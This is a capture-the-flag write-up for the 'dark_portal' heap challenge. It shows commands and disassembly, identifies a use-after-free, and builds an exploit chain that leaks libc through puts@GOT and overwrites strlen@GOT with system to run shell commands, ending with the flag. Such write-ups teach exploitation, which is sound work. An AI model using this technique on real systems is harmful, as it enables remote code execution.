# dark_portal — Professional Write‑Up (with Commands + Outputs)

## 0) Challenge info
- Service: `nc dark-portal.putcyberdays.pl 8080`
- Files: [darkportal](darkportal), [libc.so.6](libc.so.6)
- Hint highlights: instability + an `alarm()` time limit.

---

## 1) Remote recon
### Command
```bash
python3 - <<'PY'
import socket
s=socket.create_connection(('dark-portal.putcyberdays.pl',8080),timeout=5)
print(s.recv(4096))
s.close()
PY
```

### Output
```text
b'\n--- DARK PORTAL MANAGER ---\n1. Conjure a Portal\n2. Banish the Portal\n3. Reshape the Portal\n4. Inscribe a Scroll\n5. Activate Portal\n6. Depart into Shadows\nThy command? > '
```

So it’s a classic menu heap manager exposed over stdin/stdout via inetd/socat.

---

## 2) Baseline binary analysis
### 2.1 File type
#### Command
```bash
file darkportal libc.so.6
```

#### Output
```text
darkportal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=71336daf462fc879854f3f628b3379ad42b13976, for GNU/Linux 3.2.0, not stripped
libc.so.6:  ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=981c3e5a76837f41414ca6f39a1cca3b89ba64d2, for GNU/Linux 3.2.0, stripped
```

### 2.2 Hardening
#### Command
```bash
checksec --file=darkportal
```

#### Output
```text
[*] '/mnt/c/Users/sadik/Downloads/rev/darkportal'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Key takeaways:
- No PIE → fixed binary addresses (GOT, globals, vtables).
- Partial RELRO → GOT is writable.
- Canary + NX → avoid stack-smash/shellcode; prefer heap + GOT/func‑ptr abuse.

---

## 3) Symbols and structures
### 3.1 Useful symbols
#### Command
```bash
nm -n darkportal | egrep ' safe_destruct| safe_process| get_int| create_portal| delete_portal| edit_portal| create_note| activate_portal| main| default_vtable| portals| portal_count'
```

#### Output
```text
08049206 T safe_destruct
0804924e T safe_process
080492a6 T get_int
080492ec T create_portal
08049430 T delete_portal
080494fc T edit_portal
0804959e T create_note
08049621 T activate_portal
080496a1 T main
0804c03c D default_vtable
0804c080 B portals
0804c148 B portal_count
```

The presence of `default_vtable` strongly suggests the “portal” objects use a function‑pointer table (C-style vtable).

### 3.2 Confirm vtable contents
#### Command
```bash
objdump -s -j .data darkportal
```

#### Output
```text
Contents of section .data:
 804c034 00000000 00000000 06920408 4e920408  ............N...
```

At `default_vtable` (`0x804c03c`) we can see two function pointers:
- `0x08049206` → `safe_destruct`
- `0x0804924e` → `safe_process`

---

## 4) GOT addresses (for leak/overwrite)
#### Command
```bash
objdump -R darkportal
```

#### Output
```text
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
0804c010 R_386_JUMP_SLOT   free@GLIBC_2.0
0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804c028 R_386_JUMP_SLOT   strlen@GLIBC_2.0
...
```

We’ll use:
- `puts@GOT = 0x0804c020` for a libc leak
- `strlen@GOT = 0x0804c028` to redirect execution to `system`

---

## 5) The “instability” hint: alarm(20)
#### Command
```bash
objdump -d -M intel --disassemble=main darkportal | sed -n '1,120p'
```

#### Output (excerpt)
```text
080496e5: 83 ec 0c                sub    esp,0xc
080496e8: 6a 14                   push   0x14
080496ea: e8 91 f9 ff ff          call   8049080 <alarm@plt>
```

So we only get ~20 seconds per connection → exploit must be scripted, not manual.

---

## 6) Root cause: Use-After-Free on `portals[index]`
### 6.1 Portal allocation and layout
#### Command
```bash
objdump -d -M intel --disassemble=create_portal darkportal | sed -n '1,120p'
```

#### Output (excerpt)
```text
804931f: 6a 20                   push   0x20
8049321: e8 7a fd ff ff          call   80490a0 <malloc@plt>
...
804932f: c7 00 3c c0 04 08       mov    DWORD PTR [eax],0x804c03c
...
80493bc: 89 50 1c                mov    DWORD PTR [eax+0x1c],edx
```

Meaning:
- Each portal is a `malloc(0x20)` struct.
- `portal[0x00]` is a vtable pointer (initialized to `default_vtable`).
- `portal[0x1c]` is a pointer to the heap “content” buffer.

### 6.2 Delete does not clear the pointer
#### Command
```bash
objdump -d -M intel --disassemble=delete_portal darkportal | sed -n '1,160p'
```

#### Output (excerpt)
```text
804946c: 8b 04 85 80 c0 04 08    mov    eax,DWORD PTR [eax*4+0x804c080]  ; portals[idx]
...
8049493: 8b 00                   mov    eax,DWORD PTR [eax]              ; portal->vtable
8049495: 8b 00                   mov    eax,DWORD PTR [eax]              ; vtable[0]
...
80494a5: ff d0                   call   eax                               ; call vtable[0](portal)
...
80494bb: e8 b0 fb ff ff          call   8049070 <free@plt>                ; free(portal->content)
...
80494d1: e8 9a fb ff ff          call   8049070 <free@plt>                ; free(portal)
```

Critically, there is **no** store like `portals[idx] = NULL` after freeing.
That leaves a dangling pointer → classic UAF.

---

## 7) Turning UAF into a controlled object
Option 4 (“Inscribe a Scroll”) allocates arbitrary heap memory (`malloc(note_size)`) and reads attacker data into it.

So the plan is:
1. Free a portal struct (option 2)
2. Allocate a note of size `0x20` (option 4)
3. It reuses the freed portal chunk → we control the “portal” fields via note bytes.

---

## 8) Leak libc: abuse safe_process() + puts@GOT
`safe_process()` prints `portal->content` as a string:

#### Command
```bash
objdump -d -M intel --disassemble=safe_process darkportal
```

#### Output (excerpt)
```text
804927e: 8b 40 1c                mov    eax,DWORD PTR [eax+0x1c]    ; portal->content
...
8049285: 68 68 a0 04 08          push   0x804a068                  ; "[*] Content: %s"
804928a: e8 c1 fd ff ff          call   8049050 <printf@plt>
```

If we forge `portal->content = puts@GOT`, then `printf("%s")` leaks the raw bytes starting at the GOT entry.
The first 4 bytes are the resolved `puts()` address in libc.

---

## 9) Compute `system()` from the provided libc
#### Command
```bash
readelf -s libc.so.6 | egrep ' (puts|system|strlen)@@'
```

#### Output
```text
1045: 00074ed0 ... puts@@GLIBC_2.0
1972: 000a0040 ... strlen@@GLIBC_2.0
3173: 0004c920 ... system@@GLIBC_2.0
```

Then:
- `libc_base = puts_leak - 0x74ed0`
- `system = libc_base + 0x4c920`

---

## 10) Code execution: overwrite strlen@GOT → system
`edit_portal()` does:

- `len = strlen(portal->content)`
- `read(0, portal->content, len)`

#### Command
```bash
objdump -d -M intel --disassemble=edit_portal darkportal | sed -n '1,140p'
```

#### Output (excerpt)
```text
8049567: 8b 40 1c                mov    eax,DWORD PTR [eax+0x1c]
804956e: e8 5d fb ff ff          call   80490d0 <strlen@plt>
...
8049583: e8 b8 fa ff ff          call   8049040 <read@plt>
```

So if we forge `portal->content = strlen@GOT`, we can write 4 bytes to `strlen@GOT` and make it point to `system()`.

After that, calling “Reshape the Portal” on a **real** portal does:

- `system(portal->content)` (because strlen@GOT is now system)

We set `portal->content = "cat flag.txt\x00..."` and the flag prints.

---

## 11) Exploit (reproducible)
Solver script saved in [solve_dark_portal.py](solve_dark_portal.py).

### Command
```bash
python3 solve_dark_portal.py
```

### Output
```text
[+] Opening connection to dark-portal.putcyberdays.pl on port 8080: Done
[*] puts@libc = 0xf7debed0
[*] libc base  = 0xf7d77000
[*] system@libc= 0xf7dc3920
[*] Closed connection to dark-portal.putcyberdays.pl port 8080
putcCTF{Th3_Str4ng3_Ch1n33s3_4rt}
```

---

## 12) Flag
`putcCTF{Th3_Str4ng3_Ch1n33s3_4rt}`
